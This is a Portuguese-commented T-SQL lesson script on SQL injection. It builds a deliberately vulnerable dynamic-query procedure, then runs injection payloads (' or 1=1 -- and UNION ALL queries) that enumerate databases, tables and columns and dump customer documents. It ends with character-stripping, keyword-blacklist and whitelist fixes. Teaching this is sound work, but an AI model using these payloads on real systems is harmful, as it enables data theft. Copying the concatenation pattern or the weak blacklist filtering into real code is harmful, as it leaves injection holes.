https://www.red-gate.com/hub/product-learning/sql-prompt/the-risks-of-using-execute-sql-script

/*
Procedures com query din�micas (SQL INJECTION)
*/


/*
Query din�mica � uma instru��o SQL que montagem em tempo de execu��o.

Voce monta a instru��o de acordo com um conjuntos de vari�veis externas 
que determinada qual cl�sula entre ou n�o na instru��o.

Vimos uma introdu��o de query din�mica na aula "Execute" na se��o de conceitos.

*/
use eBook
go

Declare @cCMD varchar(1000) = ''
Declare @nFiltro int = 1

Declare @cIDCliente varchar(16) = '1' 
Declare @cDocumento varchar(14) = '51934436971'

Set @cCMD  = 'Select * '
Set @cCMD += '  From tCADCliente '
If @nFiltro = 1
   Set @cCMD += '  WHere iIDCliente = '+ @cIDCliente 
If @nFiltro = 2
   Set @cCMD += '  Where cDocumento = '''+ @cDocumento+''''

Execute (@cCMD)
go

/*
Neste caso, a instru��o EXECUTE � utilizada para executar qualquer 
instru��o T-SQL contidas entre aspas simples ou dentro de uma 
vari�vel char/varchar.

Alguns desenvolvedores utilizam dessa t�cnicas para deixar mais flex�vel  
as montagem de comandos e reduzindo as vezes c�digos extensos e repetitivos.

Por outro lado, pode ocorrer quebra de seguran�a e desempenho. 

*/
use eBook
go

Create or Alter Procedure stp_ConsultaLivro
@cPartePesquisa varchar(100)  ,
@nFiltro tinyint = 0
--With Execute as Owner
as
Begin  

   Set nocount on 

   Declare @cCMD varchar(1000)
   Declare @nRetorno int = 0 

   Begin Try 

      if @cPartePesquisa is null or @cPartePesquisa = ''
         Raiserror('Informa um valor v�lido para a pesquisa.', 16,1)

      if @nFiltro not in (1,2) 
         Raiserror('O valor do filtro � inv�lido. Informe o valor 1 ou 2.', 16,1)

      Set @cCMD =  'Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha '
      Set @cCMD += '  From tCADLivro '
      Set @cCMD += ' Where '+ iif(@nFiltro = 1 , 'cTitulo' ,'cSubtitulo')+' like ''%'+ @cPartePesquisa+'%'''

      Execute (@cCMD)  
         With Result sets 
         (
          (ID int NOT NULL,  
           Titulo varchar(150) NOT NULL  ,
           SubTitulo varchar(150) NOT NULL  
          )
         );  

   End Try 
   
   Begin Catch 

       Execute @nRetorno = stp_ManipulaErro

   End Catch 
   
   Return @nRetorno

End 
/*
*/
go 

/*
Come�ando a brincadeira... 
*/

/*
Pesquisou por DOG e achou v�rios livros
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro ' DOG ',2
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
Pesquisou por OR e achou v�rios livros
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro ' OR ',1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go


/*
Pesquisou por NULL 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro NULL,1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
Pesquisou por '' 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro '',1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
Pesquisou por '   ' 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro '   ',1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
Pesquisa por ICE CREAM 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'ICE CREAM',1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go



/*
Se o que eu estou passando como par�metro faz parte de uma cl�usula 
WHERE e a pesquisa retorna o valor em qualquer parte do t�tulo e do subt�tulo
podemos dizer que a consulta � por LIKE ou FTS(?)

Podemos dizer que algo que o par�metro ICE CREAM, ser� executado com a instru��o
abaixo:

Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha 
  From tCADLivro
 Where cTitulo like '%ICE CREAM%'

E se colocassemos na passagem do par�metro, esse valor :  ' or 1=1 -- 

*/

Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha 
  From tCADLivro
 Where cTitulo like '%' or 1=1 --%'

Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha 
  From tCADLivro
 Where cTitulo like '% ' or 1=1 -- %'
go
 
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro ''' or 1=1 --',1
if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
Vimos ent�o que � poss�vel passar um valor de par�metro e ele 
n�o retorna nada. Como o exemplo abaixo. 
*/

Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste', 2

if @nStatus <> 0
   select * from vLOGEventos where iIDEvento = @nStatus
go

/*
A instru��o SELECT gerada pela consulta din�mica ser�:
*/

Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha 
  From tCADLivro
 Where cTitulo like '%N�o Existe%'


/*
E se fosse poss�vel passar no valor de par�metro, uma instru��o
SELECT que recupere informa��es sobre bancos, tabelas e colunas.
*/

Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha 
  From tCADLivro
 Where cTitulo like '%N�o Existe' 
 union all
 Select Database_id, 
       Name , 
       Name 
  From sys.Databases
-- %'


/*
Sim, � possivel descobrir quais s�o os banco de dados existentes 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
Union All
Select Database_id, 
       Name , 
       Name 
  From sys.Databases
--', 2
go


/*
Descobrir quais s�o as tabelas do banco eBook 
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
union all 
select object_id, name, name from sys.objects where type = ''U'' --', 2
If @nStatus <> 0
   Select * from tLOGEventos where iIDEvento = @nStatus

go 


/*
Descobrir quais s�o as colunas da tabelas tCADCliente
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
union all 
select id, name , xtype from syscolumns where id = 933578364 --', 2
if @nStatus <> 0
   select * from tLOGEventos where iIDEvento = @nStatus

Go

/*
Lista todos os clientes com seus documentos 
*/
/*
Descobrir quais s�o as colunas da tabelas tCADCliente
*/
Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
union all 
Select iIDCliente, cNome,cDocumento from tCADCliente --', 2
if @nStatus <> 0
   select * from tLOGEventos where iIDEvento = @nStatus

GO 


/*
Algumas sugest�es 
1. Evite usar Query Din�mica.
2. Veja os caracters de entrada e rejeite os mal intencionados.
3. Avalie os par�metro do tipo caracter para conter somente os caracters esperados. 


Se n�o tem como evitar Query Din�mica, ent�o .....
*/


/*
2. Veja os caracters de entrada e rejeite os mal intencionados.
*/
Create or Alter Procedure stp_ConsultaLivro
@cPartePesquisa varchar(100)  ,
@nFiltro tinyint = 0

as
Begin  

   Declare @cCMD varchar(1000)
   Declare @nRetorno int = 0 

   Begin Try 

      Set @cPartePesquisa = replace(@cPartePesquisa,'--','') -- Retira o --
      Set @cPartePesquisa = replace(@cPartePesquisa,';','')  -- Retira o ;
      Set @cPartePesquisa = replace(@cPartePesquisa,'''','') -- Retira '
      Set @cPartePesquisa = replace(@cPartePesquisa,'%','')  -- Retira %

      if @cPartePesquisa is null 
         or @cPartePesquisa = ''
         or @cPartePesquisa like '%xp_%'   -- Execu��o de procedure de sistema
         or @cPartePesquisa like '% sys.%' -- Execu��o em tabela de sistema

         Raiserror('Informa um valor v�lido para a pesquisa.', 16,1)

      Set @cCMD =  'Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha '
      Set @cCMD += '  From tCADLivro '
      Set @cCMD += ' Where '+ iif( @nFiltro = 1 , 'cTitulo ' ,'cSubtitulo ')+'like ''%'+ @cPartePesquisa+'%'''
      Set @cCMD += ' Order by iIDLivro '

      Execute (@cCMD) With Result Sets 
                      (
                       (ID int NOT NULL,  
                        Titulo varchar(150) NOT NULL  ,
                        SubTitulo varchar(150) NOT NULL  
                       )
                      );  

   End Try 
   
   Begin Catch 

       Execute @nRetorno = stp_ManipulaErro

   End Catch 
   
   Return @nRetorno

End 
/*
*/
go 

Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
union all 
Select iIDCliente, cNome,cDocumento from tCADCliente --', 2
if @nStatus <> 0
   select * from tLOGEventos where iIDEvento = @nStatus

GO 
/*
Neste exemplo, foi eliminado os caracters  '' e o -- 
*/



/*
Um outro exemplo 
3. Avalie os par�metro do tipo caracter para conter somente os caracters esperados. 
*/

Create or Alter Procedure stp_ConsultaLivro
@cPartePesquisa varchar(100)  ,
@nFiltro tinyint = 0
as
Begin  

   Declare @cCMD varchar(1000)
   Declare @nRetorno int = 0 

   Set @cPartePesquisa = trim(@cPartePesquisa)
   
   Begin Try 

      If @cPartePesquisa is null 
         or @cPartePesquisa = ''
         or not @cPartePesquisa like replicate('[ A-Z]' , len(@cPartePesquisa) )

         Raiserror('Informa um valor v�lido para a pesquisa.', 16,1)

      Set @cCMD =  'Select iIDLivro as iID, cTitulo as Titulo , cSubtitulo as Resenha '
      Set @cCMD += '  From tCADLivro '
      Set @cCMD += ' Where '+ iif( @nFiltro = 1 , 'cTitulo ' ,'cSubtitulo ')+'like ''%'+ @cPartePesquisa+'%'''
      Set @cCMD += ' Order by iIDLivro '

      Execute (@cCMD) With Result Sets 
                      (
                       (ID int NOT NULL,  
                        Titulo varchar(150) NOT NULL  ,
                        SubTitulo varchar(150) NOT NULL  
                       )
                      );  

   End Try 
   
   Begin Catch 

       Execute @nRetorno = stp_ManipulaErro

   End Catch 
   
   Return @nRetorno

End 
/*
*/
go 

/*
*/



Declare @nStatus int 
Execute @nStatus = stp_ConsultaLivro 'N�oExiste'' 
union all 
Select iIDCliente, cNome,cDocumento from tCADCliente --', 2
if @nStatus <> 0
   select * from tLOGEventos where iIDEvento = @nStatus

GO 
